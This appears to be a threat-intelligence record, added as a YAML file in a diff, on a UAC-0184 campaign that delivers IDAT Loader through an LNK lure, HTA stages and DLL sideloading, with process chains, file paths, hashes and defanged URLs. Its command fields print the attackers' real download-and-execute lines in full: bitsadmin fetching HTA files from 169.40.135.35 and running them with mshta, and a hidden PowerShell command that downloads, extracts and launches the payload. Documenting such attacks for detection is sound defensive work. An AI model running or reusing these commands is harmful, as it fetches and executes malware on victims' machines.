@@ -1,0 +1,160 @@
+title: UAC-0184 Staged Malware Delivery via LNK, HTA, and DLL Sideloading
+description: A Ukraine-themed LNK lure delivers a multi-stage chain via a gated HTA
+  on 169.40.135.35, dropping a ZIP archive that stages DLL sideloading through Plane9/openvr_api.dll,
+  decodes kernel-diag.lib to evr.dll, parses a pseudo-PNG filter.bin via XOR+LZNT1,
+  and ultimately executes VSLauncher.exe with a repurposed PassMark input.dll for
+  C2 over UDP multicast 224.0.0.255:31339.
+attribution: UAC-0184
+malware_families:
+- IDAT Loader
+cves: []
+ttps:
+  processes:
+  - cmd.exe
+  - bitsadmin.exe
+  - mshta.exe
+  - powershell.exe
+  - Cluster-Overlay64.exe
+  - VSLauncher.exe
+  - SqlExpressChk.exe
+  - vmtoolsd.exe
+  - OneDriveSetup.exe
+  command_lines:
+  - /c bitsadmin /transfer myjob /download /priority foreground http://169.40.135.35/dctrpr/slippersuppity.hta
+    %TEMP%\~tmp('TuRIxPyZpqoctuuvttu',).hta && mshta.exe %TEMP%\~tmp('TuRIxPyZpqoctuuvttu',).hta
+  - /c bitsadmin /transfer myjob /download /priority foreground http://169.40.135.35/dctrpr/basketpast.hta
+    %TEMP%\~tmp('MUDCoGJpbAbfKdlaKZeVfka',).hta&& mshta.exe %TEMP%\~tmp('MUDCoGJpbAbfKdlaKZeVfka',).hta
+  - /c bitsadmin /transfer myjob /download /priority foreground http://169.40.135.35/dctrpr/agentdiesel.hta
+    %TEMP%\~tmp('MGMXGEDCNDKaYKStLesnn',).hta&& mshta.exe %TEMP%\~tmp('MGMXGEDCNDKaYKStLesnn',).hta
+  - powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command
+    "& { $TempDir = $env:APPDATA; $ZipFile = \"$TempDir\\dctrprraclus.zip\"; $ExtractPath
+    = \"$TempDir\\ApplicationData32\"; if (-not (Test-Path $ZipFile)) { Invoke-WebRequest
+    -Uri \"169.40.135.35/dctrprraclus.zip\" -OutFile $ZipFile }; if ((-not (Test-Path
+    \"$ExtractPath\\Cluster-Overlay64.exe\")) -and (-not (Test-Path \"$ExtractPath\\Scan_001.pdf\")))
+    { Expand-Archive -Path $ZipFile -DestinationPath $ExtractPath -Force }; Start-Process
+    \"$ExtractPath\\Cluster-Overlay64.exe\"; Start-Process \"$ExtractPath\\Scan_001.pdf\"
+    }"
+  - bitsadmin /transfer
+  - /c bitsadmin /transfer myjob /download /priority foreground http://169.40.135.35/dctrpr/basketpast.hta
+    %TEMP%\~tmp('MUDCoGJpbAbfKdlaKZeVfka',).hta && mshta.exe %TEMP%\~tmp('MUDCoGJpbAbfKdlaKZeVfka',).hta
+  - /c bitsadmin /transfer myjob /download /priority foreground http://169.40.135.35/dctrpr/agentdiesel.hta
+    %TEMP%\~tmp('MGMXGEDCNDKaYKStLesnn',).hta && mshta.exe %TEMP%\~tmp('MGMXGEDCNDKaYKStLesnn',).hta
+  - for x in *.d11 ; do printf "$x "; strings "$x" | grep "kernel-diag" ;echo "";
+    done
+  - for x in *.d11 ; do printf "$x "; strings "$x" | grep "filter.bin" ;echo ""; done
+  - for x in *.d11 ; do printf "$x "; strings "$x" | grep "openvr_api.dll" ;echo "";
+    done
+  - strings Cluster-Overlay64.exe|grep "Plane9Engine.d1l"
+  - python3 decode.py
+  powershell:
+  - '& { $TempDir = $env:APPDATA; $ZipFile = \"$TempDir\\dctrprraclus.zip\"; $ExtractPath
+    = \"$TempDir\\ApplicationData32\"; if (-not (Test-Path $ZipFile)) { Invoke-WebRequest
+    -Uri \"169.40.135.35/dctrprraclus.zip\" -OutFile $ZipFile }; if ((-not (Test-Path
+    \"$ExtractPath\\Cluster-Overlay64.exe\")) -and (-not (Test-Path \"$ExtractPath\\Scan_001.pdf\")))
+    { Expand-Archive -Path $ZipFile -DestinationPath $ExtractPath -Force }; Start-Process
+    \"$ExtractPath\\Cluster-Overlay64.exe\"; Start-Process \"$ExtractPath\\Scan_001.pdf\"
+    }'
+  scripts:
+  - slippersuppity.hta
+  - basketpast.hta
+  - agentdiesel.hta
+  registry_keys: []
+  image_loads:
+  - Plane9Engine.dll
+  - openvr_api.dll
+  - BASS.dll
+  - evr.dll
+  - input.dll
+  - dbghelp.dll
+  - kernel-diag.lib
+  - filter.bin
+  - CrashRpt1462.dll
+  - MSVCP140.dll
+  - VCRUNTIME140.dll
+  - Qt5Core.dll
+  - Qt5Xml.dll
+  - quazip.dll
+  - CrashRpt1402.dll
+  - Qt5Gui.dll
+  network_connections:
+  - bitsadmin.exe -> 169.40.135.35:80
+  - mshta.exe -> 169.40.135.35:80
+  - powershell.exe -> 169.40.135.35:80
+  - VSLauncher.exe -> 224.0.0.255:31339
+  - input.dll -> 224.0.0.255:31339
+  - input.dll -> internal peer/controller:31339
+  - bitsadmin.exe -> 169.40.135[.]35:80
+  - powershell.exe -> 169.40.135[.]35:80
+  - input.dll -> 224.0.0[.]255:31339
+  file_activity:
+  - '%TEMP%\~tmp(''TuRIxPyZpqoctuuvttu'',).hta'
+  - '%TEMP%\~tmp(''MUDCoGJpbAbfKdlaKZeVfka'',).hta'
+  - '%TEMP%\~tmp(''MGMXGEDCNDKaYKStLesnn'',).hta'
+  - '%APPDATA%\ApplicationData32\Cluster-Overlay64.exe'
+  - filter.bin
+  - kernel-diag.lib
+  - '%windir%\SysWOW64\input.dll'
+  - '%windir%\SysWOW64\VSLauncher.exe'
+  - openvr_api.dll
+  - evr.dll
+  - dctrprraclus.zip
+  - '%APPDATA%\ApplicationData32\openvr_api.dll'
+  - '%APPDATA%\ApplicationData32\filter.bin'
+  - '%APPDATA%\ApplicationData32\kernel-diag.lib'
+  - Cluster-Overlay64.exe
+  - Plane9Engine.dll
+  - BASS.dll
+  - input.dll
+  - SqlExpressChk.exe
+  - decoded.bin
+  persistence:
+  - DLL sideloading via input.dll dropped next to VSLauncher.exe under %windir%\SysWOW64\
+  - DLL sideloading via Cluster-Overlay64.exe (Plane9) loading Plane9Engine.dll ->
+    openvr_api.dll -> kernel-diag.lib -> filter.bin
+  - DLL sideloading via VSLauncher.exe loading input.dll dropped to %windir%\SysWOW64\input.dll
+  process_relations:
+  - cmd.exe -> bitsadmin.exe
+  - cmd.exe -> mshta.exe
+  - mshta.exe -> powershell.exe
+  - Cluster-Overlay64.exe -> Plane9Engine.dll
+  - Plane9Engine.dll -> openvr_api.dll
+  - openvr_api.dll -> kernel-diag.lib
+  - evr.dll -> filter.bin
+  - VSLauncher.exe -> input.dll (sideloaded)
+  - Cluster-Overlay64.exe -> Plane9
+  - VSLauncher.exe -> input.dll
+  - powershell.exe -> Cluster-Overlay64.exe
+  - kernel-diag.lib -> filter.bin
+iocs:
+  hashes:
+  - 81d93004a02a455af01b0f709e34d5134108ec350f9391dc0f91a00a54998590
+  - d735004496f54a943647a50f42ecdd094cd3d0f58a4ee5d2e36d10c5493337b7
+  - 651b07f731b23e8608eecf87e45194f903c2ccb3fd8b55ea8a6e0ca984ff8518
+  - 30a5f342c3f9bff21d18b874d51c289a5414837731118e6765dad225c55d5996
+  - df6942dc1a89226359adf1aac597c3b270f4a408214b4f7c2083f9524605e0f7
+  - dc6cddc391b373b18f105f49a80ff83d53b430d8dea35c1f1576832fa9fbd2b3
+  - f5ca9c53d1537142889d7172c6643e886b2164233b91f0fc2d41ca010f035372
+  - b811f28b844eff8c1f4f931639bed5bcc41113364fdfc44d7703259457839edb
+  - 33e44dea247eaa8b0fc8ed1f8ed575905f6ce0b7119337ddd29863bbb03288b3
+  ip_addresses:
+  - 169.40.135[.]35
+  domains: []
+  urls:
+  - hxxp://169.40.135[.]35/dctrpr/slippersuppity.hta
+  - hxxp://169.40.135[.]35/dctrpr/basketpast.hta
+  - hxxp://169.40.135[.]35/dctrpr/agentdiesel.hta
+  - hxxp://169.40.135[.]35/dctrprraclus.zip
+  - hxxp://169.40.135[.]35/dctrpr/*.hta
+  - hxxps://blog.synapticsystems[.]de/wp-content/uploads/2026/03/uac-screen-new02.png
+  - hxxps://blog.synapticsystems[.]de/wp-content/uploads/2026/03/uac-screen-new04.png
+  - hxxps://blog.synapticsystems[.]de/wp-content/uploads/2026/03/uac-screen-new05.png
+  - hxxps://blog.synapticsystems[.]de/wp-content/uploads/2026/03/uac-screen-new06-1.png
+  - hxxps://blog.synapticsystems[.]de/wp-content/uploads/2026/03/uac-screen-new07.png
+  - hxxps://blog.synapticsystems[.]de/wp-content/uploads/2026/03/uac-screen-new08.png
+  - hxxps://blog.synapticsystems[.]de/wp-content/uploads/2026/03/uac-screen-new14.png
+  - hxxps://blog.synapticsystems[.]de/wp-content/uploads/2026/03/uac-screen-new17.png
+authors:
+- Robin Dost
+reference: https://blog.synapticsystems.de/uac-0184-from-hta-to-a-signed-network-stack/#comment-314
+date_of_publication: May 18, 2026
+file_creation_date: May 22, 2026
